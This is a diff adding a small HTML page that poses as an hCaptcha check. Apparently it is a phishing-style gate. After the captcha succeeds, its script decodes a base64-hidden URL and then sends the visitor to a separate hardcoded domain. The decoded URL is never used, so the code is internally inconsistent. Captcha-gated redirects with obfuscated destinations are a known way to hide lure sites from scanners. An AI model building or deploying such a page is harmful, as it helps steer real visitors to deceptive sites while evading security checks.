@@ -1,0 +1,35 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Captcha</title>
+</head>
+<style>
+    @media only screen and (max-width: 600px) {
+        .h-captcha {
+            transform: scale(1.2);
+        }
+    }
+</style>
+<body>
+    <div style="display: flex; justify-content: center; align-items: center; height: 100vh;">
+        <form id="captchaForm" action="/validate-captcha" method="POST">
+            <div class="h-captcha" data-sitekey="c61cfc4f-1ec4-452c-9bf6-96c7be08e7e9" data-callback="onCaptchaSuccess"></div>
+            <br />
+        </form>
+    </div>
+</body>
+<script>
+    function redirectToEncodedUrl(encodedUrl) {
+        let decodedUrl = atob(encodedUrl);
+        window.location.href = "https://grenz-kosten-analyse.net/";
+    }
+
+    function onCaptchaSuccess(token) {
+        let encodedUrl = "aHR0cHM6Ly9zbmVsbGUtdmVyemVuZC1vcGxvc3NpbmctbmxuZXQv";
+        redirectToEncodedUrl(encodedUrl);
+    }
+</script>
+<script src="https://js.hcaptcha.com/1/api.js?key=Enterprise Feature" async defer></script>
+</html>
